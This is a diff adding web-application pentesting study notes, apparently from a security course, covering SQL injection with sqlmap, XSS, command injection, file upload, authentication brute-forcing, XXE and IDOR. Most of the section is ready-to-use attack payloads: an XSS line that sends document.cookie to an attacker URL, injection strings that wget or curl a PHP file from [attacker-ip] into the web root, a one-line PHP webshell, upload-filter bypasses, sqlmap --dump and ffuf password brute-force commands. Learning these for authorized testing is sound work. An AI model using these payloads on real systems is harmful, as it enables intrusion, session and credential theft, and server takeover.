@@ -846,3 +846,108 @@ Look for old devices which may have WDigest enabled on them!
 Look into file shares, especially if someone has permission to many file shares!
 
 **KEEP ENUMERATING!**
+
+## Web Application Pentesting
+
+Useful github repo: https://github.com/swisskyrepo/PayloadsAllTheThings
+
+*Good source:* Portswigger
+
+*Good source:* https://appsecexplained.gitbook.io/appsecexplained
+
+### SQL Injection
+
+Lets you modifying the use of an input in a SQL query.
+
+Figure out how an application works and what its intended use is.
+
+*Good source:* Portswigger SQL injection cheatsheet
+
+sqlmap:
+- `mkdir req.txt` put your request in here
+- `sqlmap -r req.txt`
+
+Think about everything you supply to the application and how it may be used.
+
+Can ask True/False questions if no date is being outputted. Use `substring()` or `sqlmap`.
+
+sqlmap injecting in cookies:
+- `sqlmap -r req2.txt --level=2`
+- `sqlmap -r req2.txt --level=2 --dump` for dumping data in tables
+
+### XXS (Cross Site Scripting)
+
+Three types:
+- Reflected
+- Stored
+- DOM
+
+Test for XXS:
+- `<script>print()</script>`
+- `<script>prompt("Hello World!")</script>`
+
+Execute script using if the page does not reload when trying the exploit:
+- `<img src=x onerror="print()">`
+
+Exfiltrating data:
+- `<script>var i= new Image; i.src="[url]/?"+document.cookie`
+
+### Command injection
+
+Inject bash, php, python, etc. through an input.
+- `http://tcm-sec.com ; whoami; asd`
+- `http://[url]/?'[command]'`
+- Host a python webserver on port `[port]`
+  - `https://tcm-sec.com \n wget [attacker-ip]:[port]/[filename].php`
+  - `https://tcm-sec.com && curl [attacker-ip]:[port]/[filename].php > /var/www/html/[filename].php`
+
+### Insecure file upload
+
+Look for calls in network when uploading files.
+
+Upload accepted file type
+- Run BurpSuite
+- Try to upload a different file through repeater
+- Try php webshell.
+  - `<?-php- system($_GET['cmd']); ?>`
+  - Try to see where it goes
+    - `ffuf -u http://[url]/FUZZ -w /usr/shar/wordlists/dirb/common.txt`
+- If checks run server-side:
+  - `.png%00.png` (l-byte attacks)
+  - `.php.png`
+  - Magic bytes
+    - Insert payload in the png file content and change the file extension to `.php`
+  - Try to bypass the file extension blocklist by using `.php5`, `.phtml,` etc
+
+### Attacking Authentication
+
+*Good source:* https://appsecexplained.gitbook.io/appsecexplained
+
+Brute force with ffuf
+- `mousepad bruteforce.txt` (Put `FUZZ` where the password must go)
+- `ffuf -request bruteforce.txt -request-proto http -w /usr/share/seclists/Passwords/cato-net-10-million-passwords-10000.txt`
+- `ffuf -request bruteforce.txt -request-proto http -w /usr/share/seclists/Passwords/cato-net-10-million-passwords-10000.txt -fs [failed response length]`
+
+MFA
+-  Try logging in and change the name to the name of the target
+
+Login restrictions bruteforcing
+- `mousepad bruteforce.txt` (Put `FUZZUSER` where the user must go and `FUZZPASS` where the password must go)
+- `ffuf -request bruteforce.txt -request-proto http -mode clusterbomb -w [password wordlist]:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs [failed response length]`
+
+### XXE (External Entities Injection)
+
+Abusing misconfigurations in `.xml` files.
+
+Good place to find payloads: https://github.com/swisskyrepo/PayloadsAllTheThings 
+
+Send this to API-endpoints that accepts `.json`
+
+### IDOR - Insecure Direct Object Reference
+
+Seen a lot in API applications. Called **BOLA**.
+
+Find a point to manipulate ID and change the ID.
+
+Try to enumerate all users
+- `ffuf -u 'http://[url]?account=FUZZ' -w [wordlist] -fs [failed response length] | grep FUZZ`
